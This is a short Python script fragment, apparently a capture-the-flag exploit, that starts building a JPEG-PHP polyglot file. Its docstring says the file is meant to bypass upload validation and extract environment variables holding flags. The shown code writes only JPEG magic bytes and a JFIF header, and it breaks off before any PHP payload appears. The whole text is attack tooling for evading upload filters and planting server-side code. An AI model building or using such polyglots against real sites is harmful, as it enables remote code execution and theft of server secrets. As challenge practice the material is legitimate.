import struct

# JPEG file structure with embedded PHP payload
def create_jpeg_php_polyglot():
    """
    Create a polyglot JPEG-PHP file that bypasses upload validation
    and extracts environment variables containing flags.
    """
    
    # Minimal JPEG header
    jpeg_header = bytearray()
    
    # SOI (Start of Image) marker - required for JPEG validation
    jpeg_header.extend(b'\xFF\xD8')  # JPEG magic bytes
    
    # APP0 segment - JFIF identifier (common in JPEGs)
    jpeg_header.extend(b'\xFF\xE0')  # APP0 marker
    jpeg_header.extend(struct.pack('>H', 16))  # Segment length
    jpeg_header.extend(b'JFIF\x00')  # JFIF identifier
    jpeg_header.extend(b'\x01\x02')  # Version
    jpeg_header.extend(b'\x00')  # Units
    jpeg_header.extend(b'\x00\x01\x00\x01')  # X/Y density
    jpeg_header.extend(b'\x00\x00')  # Thumbnail
    
